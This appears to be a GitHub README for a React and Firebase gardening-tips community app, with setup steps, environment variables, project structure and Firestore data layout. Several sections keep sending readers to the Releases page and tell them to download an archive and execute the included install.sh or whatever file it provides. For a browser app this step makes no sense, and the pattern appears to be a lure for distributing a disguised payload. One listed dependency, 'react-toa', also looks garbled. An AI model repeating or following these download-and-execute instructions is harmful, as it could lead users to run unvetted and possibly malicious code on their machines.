[![Releases](https://img.shields.io/badge/Releases-download-blue?logo=github)](https://github.com/Rbcthr/easy-garden-client/releases)

# Easy Garden Client — Plant Care Community App in React 🌿

A client-side React app for a community site about gardening. Users create accounts, log in, post tips, and discuss plant care. The UI uses Tailwind CSS and DaisyUI. Auth and data use Firebase. Swiper handles galleries. Small, focused components make the app easy to read and extend.

![Garden hero image](https://images.unsplash.com/photo-1501004318641-b39e6451bec6?auto=format&fit=crop&w=1400&q=60)

---

Table of contents
- Features
- Demo / Releases
- Built with
- Quick start
- Environment variables
- Run the release file
- Project structure
- Key components
- Routing and pages
- Data flow and Firebase
- Styling and assets
- Testing and linting
- Contributing
- License
- Contact

---

## Features ✨
- Account creation and email/password sign-in using Firebase Auth.
- Create, edit, and delete tips and posts with images.
- Comment and like system for posts.
- Responsive UI with Tailwind CSS and DaisyUI components.
- Image carousel using Swiper.js.
- Tiny animated headings with react-simple-typewriter.
- Smooth reveal animations with react-awesome-reveal.
- Sweet alerts for confirm dialogs via react-sweetalert2.
- Light/dark theme toggle using react-toggle-dark-mode.
- Iconography from react-icons.
- Toast notifications using react-toa.
- Full client-side routing with react-router.
- Firebase Firestore for posts and comments, Firebase Storage for images.

---

## Demo / Releases 🔽
Download the latest release from:
https://github.com/Rbcthr/easy-garden-client/releases

This releases page contains build artifacts and packaged files. Download the release asset (for example: easy-garden-client-v1.0.0.zip) and execute the included run or install script as described below.

[![Download Releases](https://img.shields.io/badge/Get%20Releases-From%20GitHub-8da0cb?logo=github)](https://github.com/Rbcthr/easy-garden-client/releases)

---

## Built with 🛠️
- React
- Firebase (Auth, Firestore, Storage)
- Tailwind CSS + DaisyUI
- Swiper.js
- react-router
- react-icons
- react-awesome-reveal
- react-simple-typewriter
- react-sweetalert2
- react-toa
- react-toggle-dark-mode

---

## Quick start — Local development

Prerequisites
- Node.js >= 16
- npm or pnpm
- Git
- A Firebase project with Auth, Firestore, Storage enabled

Clone
```bash
git clone https://github.com/Rbcthr/easy-garden-client.git
cd easy-garden-client
```

Install
```bash
npm install
# or
pnpm install
```

Set environment variables (see next section). Then run:
```bash
npm run dev
# or
pnpm dev
```

Open http://localhost:3000 (or the port reported by Vite) to view the app.

---

## Environment variables
Create a .env.local file in the project root with your Firebase config.
Required keys:
- VITE_FIREBASE_API_KEY
- VITE_FIREBASE_AUTH_DOMAIN
- VITE_FIREBASE_PROJECT_ID
- VITE_FIREBASE_STORAGE_BUCKET
- VITE_FIREBASE_MESSAGING_SENDER_ID
- VITE_FIREBASE_APP_ID

Example .env.local
```env
VITE_FIREBASE_API_KEY=your_api_key_here
VITE_FIREBASE_AUTH_DOMAIN=your-app.firebaseapp.com
VITE_FIREBASE_PROJECT_ID=your-project-id
VITE_FIREBASE_STORAGE_BUCKET=your-app.appspot.com
VITE_FIREBASE_MESSAGING_SENDER_ID=sender_id
VITE_FIREBASE_APP_ID=app_id
```

---

## Run the release file (download and execute) 📦
Visit the releases page and download the packaged asset:
https://github.com/Rbcthr/easy-garden-client/releases

Find the asset named like `easy-garden-client-vX.Y.Z.zip` or `easy-garden-client-vX.Y.Z.tar.gz`. Download and extract it, then run the included script or commands. Typical steps after extracting:
```bash
# example after unzip
cd easy-garden-client-v1.0.0
# if an install script exists
chmod +x install.sh
./install.sh

# or run npm commands if source included
npm install
npm run start
```
The release page contains the exact files. Download the specific release asset and execute the file or script it provides.

---

## Project structure
- src/
  - components/      # Reusable UI components
  - pages/           # Route-level pages
  - hooks/           # Custom React hooks
  - services/        # Firebase wrappers: auth, db, storage
  - styles/          # Tailwind config and custom CSS
  - utils/           # Helpers and constants
- public/            # Static assets
- .env.example       # Env var example
- package.json

Key files
- src/main.jsx — app entry, providers, theme toggle
- src/App.jsx — route definitions
- src/services/firebase.js — firebase init and exports

---

## Key components
- AuthForm — sign-up and sign-in UI with validation.
- TipEditor — create/edit post UI with image upload to Firebase Storage.
- TipCard — compact post view with like/comment actions.
- TipList — paginated feed using Firestore queries.
- Carousel — Swiper wrapper for image galleries.
- ThemeToggle — dark/light toggle using react-toggle-dark-mode.
- ToastWrapper — central toast container using react-toa.

---

## Routing and pages
Routes follow this pattern:
- / — home feed
- /post/:id — single post view with comments
- /create — create new tip (auth required)
- /edit/:id — edit tip (author only)
- /profile/:uid — user profile and user tips
- /login — sign-in / sign-up
- /about — project info and contributors

All route guards use a simple auth context and redirect to /login if not authenticated.

---

## Data flow and Firebase
- Auth: Firebase Auth with JWTs handled by the SDK.
- Data: Firestore collections:
  - posts — main tip documents { title, body, authorId, images[], createdAt, likes }
  - comments — subcollection under posts
  - users — basic profile data and bio
- Storage: Images upload to Firebase Storage and save the public URL in the post document.
- Security: Firestore rules should restrict writes to authenticated users and allow only owners to edit/delete their posts.

Example Firestore write (pseudo)
```js
const ref = firestore.collection('posts').doc();
await ref.set({
  title,
  body,
  authorId: user.uid,
  images,
  createdAt: serverTimestamp()
});
```

---

## Styling and assets
The app uses Tailwind CSS and DaisyUI for components. DaisyUI adds ready-made components; the project keeps styles in utility classes and small component-level CSS.

Image gallery uses Swiper.js. Animations use react-awesome-reveal for subtle motion. Typewriter headings use react-simple-typewriter.

Icons come from react-icons (Feather, Heroicons, FontAwesome). Toasts come from react-toa.

---

## Testing and linting
Basic scripts are in package.json:
```bash
npm run lint       # eslint
npm run format     # prettier
npm run test       # runs tests if present
npm run build      # production build
npm run preview    # preview production build
```
Add unit tests for critical hooks and services. Mock Firebase with a local emulator for stable CI runs.

---

## Contributing 🤝
- Fork the repo.
- Create a feature branch: git checkout -b feature/name
- Commit changes with clear messages.
- Open a pull request with a description and test steps.
- Label PRs with the category and link related issues.

Follow code style: ESLint rules and Prettier format. Keep components small and focused. Add unit tests for new logic in services and hooks.

---

## License
MIT — see LICENSE file.

---

## Contact
Repo: https://github.com/Rbcthr/easy-garden-client
Issues and pull requests live on GitHub. Use the Releases page to fetch packaged builds:
https://github.com/Rbcthr/easy-garden-client/releases

<img src="https://cdn.jsdelivr.net/gh/twitter/twemoji@14.0.2/assets/72x72/1f331.png" alt="seedling" width="32" />